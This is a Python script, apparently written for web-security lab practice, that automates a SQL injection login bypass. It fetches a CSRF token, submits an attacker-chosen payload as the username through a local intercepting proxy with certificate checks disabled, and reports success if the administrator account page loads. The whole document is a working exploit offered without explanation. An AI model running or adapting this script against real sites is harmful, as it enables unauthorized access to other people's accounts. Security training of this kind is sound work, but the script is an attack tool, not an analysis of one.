# SQL injection vulnerability allowing login bypass

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from bs4 import BeautifulSoup as bs


proxies = {'http' : 'http://127.0.0.1:8080', 'https' : 'http://127.0.0.1:8080'}

def get_csrf_token(s,url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = bs(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_SQLi(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {'csrf' : csrf,
            'username' : payload,
            'password' : "random password"}
    
    r = s.post(url,  data=data, verify=False, proxies = proxies)
    res = r.text
    
    if "Update email" in res:
        return True
    else:
        return False
    
    
if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url> <payload>')
        print(f'[-] example: {sys.argv[0]} www.example.com "1=1"')
        
    s = requests.Session()
    
    if exploit_SQLi(s, url, payload):
        print("[+] " + '\033[32m' + "SQL Injection successful! We have logged in as administrator user." + '\033[0m')
    else:
        print("[+] " + '\033[31m' + "SQL injection failed! Couldnot log in as administrator user." + '\033[0m')       
    
        